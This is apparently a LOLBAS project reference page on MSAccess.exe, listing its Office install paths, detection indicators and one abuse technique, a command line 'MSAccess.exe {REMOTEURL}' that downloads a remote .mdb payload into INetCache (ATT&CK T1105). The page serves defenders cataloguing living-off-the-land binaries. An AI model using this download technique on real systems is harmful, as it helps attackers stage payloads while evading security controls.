---
title: "MSAccess.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msaccess/
fetched_at: 2026-09-20T17:14:59Z
license: unspecified
category: windows
---

Microsoft Office component

## Paths
- C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSAccess.exe
- C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSAccess.exe
- C:\Program Files (x86)\Microsoft Office\Office16\MSAccess.exe
- C:\Program Files\Microsoft Office\Office16\MSAccess.exe
- C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSAccess.exe
- C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSAccess.exe
- C:\Program Files (x86)\Microsoft Office\Office15\MSAccess.exe
- C:\Program Files\Microsoft Office\Office15\MSAccess.exe
- C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSAccess.exe
- C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSAccess.exe
- C:\Program Files (x86)\Microsoft Office\Office14\MSAccess.exe
- C:\Program Files\Microsoft Office\Office14\MSAccess.exe
- C:\Program Files (x86)\Microsoft Office\Office12\MSAccess.exe
- C:\Program Files\Microsoft Office\Office12\MSAccess.exe

## Acknowledgements
- Nir Chako ([@C_h4ck_0](https://twitter.com/@C_h4ck_0))

## Detections
- IOC: URL on a MSAccess command line
- IOC: MSAccess making unexpected network connections or DNS requests

## Download

1. Downloads payload from remote server

```
MSAccess.exe {REMOTEURL}
```

   - Use case: It will download a remote payload (if it has the filename extension .mdb) and place it in INetCache.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
